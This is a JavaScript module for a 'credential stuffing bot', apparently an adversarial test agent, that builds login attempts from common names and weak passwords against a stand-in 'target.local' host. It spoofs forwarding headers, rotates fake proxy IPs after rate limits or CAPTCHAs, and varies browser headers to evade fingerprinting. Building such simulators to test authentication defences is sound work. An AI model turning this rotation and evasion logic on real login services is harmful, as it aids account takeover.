/**
 * Credential Stuffing Bot - Dark Layer Adversarial Agent
 * 
 * Simulates credential stuffing attacks using leaked credential lists.
 * Tests authentication endpoint resilience and rate limiting.
 * 
 * DARK LAYER ONLY - No telemetry, no logging.
 */

const PHI = 1.618033988749895;
const HB = 873;

/**
 * Common username patterns
 */
const USERNAME_PATTERNS = [
  '{first}.{last}',
  '{first}{last}',
  '{first}_{last}',
  '{first}{last}{year}',
  '{first}.{last}{number}',
  '{initial}{last}',
  '{first}{number}'
];

/**
 * First names pool
 */
const FIRST_NAMES = [
  'john', 'jane', 'michael', 'sarah', 'david', 'emily', 'james', 'emma',
  'robert', 'olivia', 'william', 'sophia', 'richard', 'ava', 'joseph', 'mia',
  'thomas', 'isabella', 'charles', 'charlotte', 'admin', 'test', 'user', 'demo'
];

/**
 * Last names pool
 */
const LAST_NAMES = [
  'smith', 'johnson', 'williams', 'brown', 'jones', 'garcia', 'miller', 'davis',
  'rodriguez', 'martinez', 'hernandez', 'lopez', 'gonzalez', 'wilson', 'anderson',
  'thomas', 'taylor', 'moore', 'jackson', 'martin', 'lee', 'perez', 'thompson', 'white'
];

/**
 * Common password patterns (for simulation)
 */
const PASSWORD_PATTERNS = [
  'password123',
  'qwerty123',
  '123456789',
  '{first}2023',
  '{first}123',
  '{first}!',
  'Welcome1',
  'P@ssw0rd',
  'Summer2023',
  'Winter2023',
  'Spring2023',
  'Fall2023',
  '{company}123',
  'letmein',
  'admin123',
  'changeme',
  '1qaz2wsx',
  'password1',
  'abc123',
  'monkey'
];

/**
 * Proxy rotation simulation
 */
const PROXY_POOLS = [
  { type: 'residential', region: 'us', count: 10000 },
  { type: 'datacenter', region: 'eu', count: 5000 },
  { type: 'mobile', region: 'asia', count: 2000 },
  { type: 'rotating', region: 'global', count: 50000 }
];

/**
 * Credential Stuffing Bot
 */
export class CredentialStuffingBot {
  constructor(config = {}) {
    this.id = `credstuff-${crypto.randomUUID().slice(0, 8)}`;
    this.config = {
      maxAttempts: config.maxAttempts || 10000,
      rotateAfter: config.rotateAfter || 5, // Rotate IP after N attempts
      useProxies: config.useProxies !== false,
      slowMode: config.slowMode || false, // Human-like delays
      targetEndpoints: config.targetEndpoints || ['/login', '/api/auth', '/signin', '/api/login'],
      ...config
    };
    
    this.state = {
      attempts: 0,
      successfulLogins: [],
      blockedIPs: new Set(),
      rateLimitHits: 0,
      captchaTriggers: 0,
      currentProxy: null,
      proxyRotations: 0,
      credentials: [],
      phase: 'initialization'
    };
    
    this.generateCredentialList();
    this.selectProxy();
  }
  
  /**
   * Generate credential list
   */
  generateCredentialList() {
    const credentials = [];
    
    for (let i = 0; i < this.config.maxAttempts; i++) {
      const first = FIRST_NAMES[Math.floor(Math.random() * FIRST_NAMES.length)];
      const last = LAST_NAMES[Math.floor(Math.random() * LAST_NAMES.length)];
      const year = 2020 + Math.floor(Math.random() * 4);
      const number = Math.floor(Math.random() * 1000);
      
      // Generate username
      const usernamePattern = USERNAME_PATTERNS[Math.floor(Math.random() * USERNAME_PATTERNS.length)];
      const username = usernamePattern
        .replace('{first}', first)
        .replace('{last}', last)
        .replace('{year}', year)
        .replace('{number}', number)
        .replace('{initial}', first[0]);
      
      // Generate password
      const passwordPattern = PASSWORD_PATTERNS[Math.floor(Math.random() * PASSWORD_PATTERNS.length)];
      const password = passwordPattern
        .replace('{first}', first.charAt(0).toUpperCase() + first.slice(1))
        .replace('{company}', 'Company');
      
      credentials.push({
        username,
        password,
        email: `${username}@${['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'][Math.floor(Math.random() * 4)]}`
      });
    }
    
    this.state.credentials = credentials;
  }
  
  /**
   * Select proxy from pool
   */
  selectProxy() {
    if (!this.config.useProxies) {
      this.state.currentProxy = { ip: '192.168.1.1', type: 'direct' };
      return;
    }
    
    const pool = PROXY_POOLS[Math.floor(Math.random() * PROXY_POOLS.length)];
    this.state.currentProxy = {
      ip: this.generateProxyIP(pool),
      type: pool.type,
      region: pool.region,
      rotations: this.state.proxyRotations
    };
    this.state.proxyRotations++;
  }
  
  /**
   * Generate fake proxy IP
   */
  generateProxyIP(pool) {
    const ranges = {
      'us': ['104', '52', '34', '44'],
      'eu': ['35', '185', '195', '212'],
      'asia': ['103', '115', '122', '175'],
      'global': ['1', '255', '128', '64']
    };
    
    const firstOctet = ranges[pool.region][Math.floor(Math.random() * ranges[pool.region].length)];
    return `${firstOctet}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`;
  }
  
  /**
   * Generate next login attempt
   */
  async nextAttempt() {
    // Check if should rotate proxy
    if (this.state.attempts > 0 && this.state.attempts % this.config.rotateAfter === 0) {
      this.selectProxy();
    }
    
    const credential = this.state.credentials[this.state.attempts];
    if (!credential) {
      this.state.phase = 'exhausted';
      return null;
    }
    
    this.state.attempts++;
    
    // Select random endpoint
    const endpoint = this.config.targetEndpoints[
      Math.floor(Math.random() * this.config.targetEndpoints.length)
    ];
    
    // Build request
    const request = {
      url: `https://target.local${endpoint}`,
      method: 'POST',
      headers: this.buildHeaders(),
      body: JSON.stringify({
        username: credential.username,
        password: credential.password,
        email: credential.email,
        remember: Math.random() > 0.5
      }),
      agentId: this.id,
      timestamp: Date.now(),
      metadata: {
        attemptNumber: this.state.attempts,
        proxyInfo: this.state.currentProxy,
        phase: this.state.phase,
        credential: {
          username: credential.username,
          // Don't include actual password in metadata
          passwordLength: credential.password.length
        }
      }
    };
    
    return request;
  }
  
  /**
   * Build realistic headers
   */
  buildHeaders() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
    ];
    
    const headers = {
      'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
      'Content-Type': 'application/json',
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Connection': 'keep-alive',
      'Origin': 'https://target.local',
      'Referer': 'https://target.local/login',
      'X-Forwarded-For': this.state.currentProxy.ip,
      'X-Real-IP': this.state.currentProxy.ip
    };
    
    // Add fingerprinting evasion
    if (Math.random() > 0.5) {
      headers['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
      headers['Sec-Ch-Ua-Mobile'] = '?0';
      headers['Sec-Ch-Ua-Platform'] = '"Windows"';
      headers['Sec-Fetch-Dest'] = 'empty';
      headers['Sec-Fetch-Mode'] = 'cors';
      headers['Sec-Fetch-Site'] = 'same-origin';
    }
    
    return headers;
  }
  
  /**
   * Process response
   */
  async processResponse(response) {
    const status = response.status;
    
    // Track successful login
    if (status === 200) {
      const body = await response.json?.() || {};
      if (body.token || body.success || body.authenticated) {
        const cred = this.state.credentials[this.state.attempts - 1];
        this.state.successfulLogins.push({
          username: cred.username,
          timestamp: Date.now(),
          proxy: this.state.currentProxy.ip
        });
        this.state.phase = 'success-found';
      }
    }
    
    // Track rate limiting
    if (status === 429) {
      this.state.rateLimitHits++;
      this.state.blockedIPs.add(this.state.currentProxy.ip);
      this.selectProxy(); // Rotate on rate limit
      this.state.phase = 'rate-limited';
    }
    
    // Track CAPTCHA triggers
    if (status === 403 || status === 418) {
      const body = await response.text?.() || '';
      if (body.includes('captcha') || body.includes('challenge')) {
        this.state.captchaTriggers++;
        this.selectProxy();
        this.state.phase = 'captcha-detected';
      }
    }
    
    // Track blocked IPs
    if (status === 403) {
      this.state.blockedIPs.add(this.state.currentProxy.ip);
      this.selectProxy();
    }
    
    // Normal operation
    if (this.state.phase !== 'success-found' && this.state.phase !== 'exhausted') {
      this.state.phase = 'active-stuffing';
    }
  }
  
  /**
   * Check if should continue
   */
  shouldContinue() {
    return (
      this.state.attempts < this.config.maxAttempts &&
      this.state.phase !== 'exhausted' &&
      this.state.blockedIPs.size < PROXY_POOLS.reduce((sum, p) => sum + p.count, 0) * 0.9
    );
  }
  
  /**
   * Get agent state
   */
  getState() {
    return {
      id: this.id,
      type: 'credential-stuffing',
      attempts: this.state.attempts,
      successfulLogins: this.state.successfulLogins.length,
      rateLimitHits: this.state.rateLimitHits,
      captchaTriggers: this.state.captchaTriggers,
      blockedIPs: this.state.blockedIPs.size,
      proxyRotations: this.state.proxyRotations,
      currentProxy: {
        type: this.state.currentProxy?.type,
        region: this.state.currentProxy?.region
      },
      phase: this.state.phase,
      successRate: this.state.attempts > 0 
        ? (this.state.successfulLogins.length / this.state.attempts * 100).toFixed(2) + '%'
        : '0%',
      progress: this.state.attempts / this.config.maxAttempts
    };
  }
}

export default CredentialStuffingBot;
